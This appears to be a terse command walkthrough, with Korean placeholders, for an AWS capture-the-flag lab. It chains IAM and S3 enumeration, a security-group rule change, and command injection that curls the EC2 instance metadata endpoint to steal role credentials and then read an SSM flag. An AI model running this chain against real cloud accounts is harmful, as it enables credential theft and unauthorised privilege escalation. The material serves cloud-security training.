
`cat start.txt`
`aws configure --profile [시작사용자]`

`aws --profile [사용자] sts get-caller-identity`

`aws --profile [사용자] iam list-user-policies --user-name [user_name]`

`aws --profile [사용자] iam get-user-policy --user-name [user_name] --policy-name [정책이름]`

`aws --profile [사용자] iam list-attached-user-policies --user-name [user_name]`

`aws ec2 describe-instances --profile [시작사용자]`

`http://ec2주소`

`aws ec2 descrbe-security-groups --profile [시작사용자]`

`aws s3 ls --profile [시작사용자]`

`aws s3 ls s3://[버킷이름]/ --profile [시작사용자]`
`aws s3 cp s3://[버킷이름]/[텍스트파일].txt --profile [시작사용자]`
`cat [텍스트파일].txt`

`aws configure --profile [ec2 방화벽 관리자]`

`aws --profile [사용자] iam list-user-policies --user-name [ec2 방화벽 관리자]`

`aws --profile [ec2 방화벽 관리자] iam get-user-policy --user-name [user_name] --policy-name [정책이름]`

`aws ec2 revoke-security-group-ingress --group-id <security group id> --protocol <tcp/udp> --port <port number> --cidr <cidr>`
`aws ec2 authorize-security-group-ingress --group-id <security group id> --protocol <tcp/udp> --port <port number> --cidr <cidr>`

`aws ec2 reboot-instances --instance-ids [인스턴스 id] --profile [ec2 방화벽 관리자]`

`aws ec2 describe-instances --profile [시작사용자]`

`http://ec2주소`

`http://ec2주소?cmd = curl http://169.254.169.254/latest/meta-data/iam/security-credentials/aws_ssm_role`

`aws configure --profile [ssmrole_사용자]`
`echo "aws_session_token = {얻은 토큰}" >> ~/.aws/credentials`

`aws --profile [ssmrole_사용자] sts get-caller-identity`

`aws iam list-attached-role-policies --role-name [role_name] --profile [시작사용자]`

`aws --profile [ssmrole_사용자] ssm get-parameter --name flag`
